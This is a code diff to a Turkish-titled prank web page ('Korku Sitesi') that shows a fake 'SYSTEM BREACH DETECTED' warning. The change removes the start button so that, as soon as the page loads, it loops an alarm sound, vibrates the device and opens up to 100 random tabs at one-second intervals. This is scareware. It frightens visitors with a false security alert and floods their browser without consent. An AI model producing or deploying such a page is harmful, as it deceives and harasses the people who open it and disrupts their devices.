@@ -3,10 +3,9 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Korku Sitesi</title>
+<title>Korku Sitesi Otomatik</title>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
-
   body {
     margin: 0;
     height: 100vh;
@@ -53,30 +52,10 @@
     width: 50px;
     filter: drop-shadow(0 0 5px red);
   }
-  button {
-    margin-top: 30px;
-    font-size: 1.5em;
-    background-color: red;
-    color: white;
-    border: none;
-    padding: 12px 24px;
-    cursor: pointer;
-    border-radius: 6px;
-    user-select: none;
-    transition: background-color 0.3s;
-  }
-  button:hover:not(:disabled) {
-    background-color: darkred;
-  }
-  button:disabled {
-    background-color: gray;
-    cursor: not-allowed;
-  }
 </style>
 </head>
 <body>
   <h1>Korku Sitesi</h1>
-
   <div class="terminal">
     <h2>⚠️ SYSTEM BREACH DETECTED ⚠️</h2>
     <pre>
@@ -91,15 +70,9 @@ Please disconnect your device immediately!
     <img class="skull" src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3f/Skull_icon.svg/1024px-Skull_icon.svg.png" alt="Skull Icon" />
   </div>
 
-  <button id="toggleBtn">Kapat</button>
-
 <script>
   const audio = new Audio('https://actions.google.com/sounds/v1/alarms/alarm_clock.ogg');
   audio.loop = true;
-  let vibrating = false;
-  let intervalId;
-  let openCount = 0;
-  const maxOpen = 100;
 
   function vibratePattern() {
     if (navigator.vibrate) {
@@ -111,7 +84,7 @@ Please disconnect your device immediately!
     const urls = [
       'https://example.com',
       'https://en.wikipedia.org/wiki/Virus_(computing)',
-      'https://www.youtube.com/watch?v=dQw4w9WgXcQ', // Rickroll :D
+      'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
       'https://www.google.com/search?q=virus',
       'https://www.bing.com/search?q=virus'
     ];
@@ -119,24 +92,21 @@ Please disconnect your device immediately!
     window.open(url, '_blank');
   }
 
-  document.getElementById('toggleBtn').addEventListener('click', () => {
-    if (!vibrating) {
-      vibrating = true;
-      audio.play().catch(e => console.log('Ses çalınamadı:', e));
-      intervalId = setInterval(() => {
-        vibratePattern();
-        if (openCount < maxOpen) {
-          openRandomPage();
-          openCount++;
-        } else {
-          clearInterval(intervalId);
-        }
-      }, 1000); // 1 saniye arayla aç
-      const btn = document.getElementById('toggleBtn');
-      btn.textContent = 'Başlatıldı';
-      btn.disabled = true; // bir kez tıklanıp kapandıktan sonra devre dışı kalsın
-    }
-  });
+  window.onload = () => {
+    audio.play().catch(e => console.log('Ses çalınamadı:', e));
+    let openCount = 0;
+    const maxOpen = 100;
+
+    const intervalId = setInterval(() => {
+      vibratePattern();
+      if (openCount < maxOpen) {
+        openRandomPage();
+        openCount++;
+      } else {
+        clearInterval(intervalId);
+      }
+    }, 1000);
+  }
 </script>
 </body>
 </html>
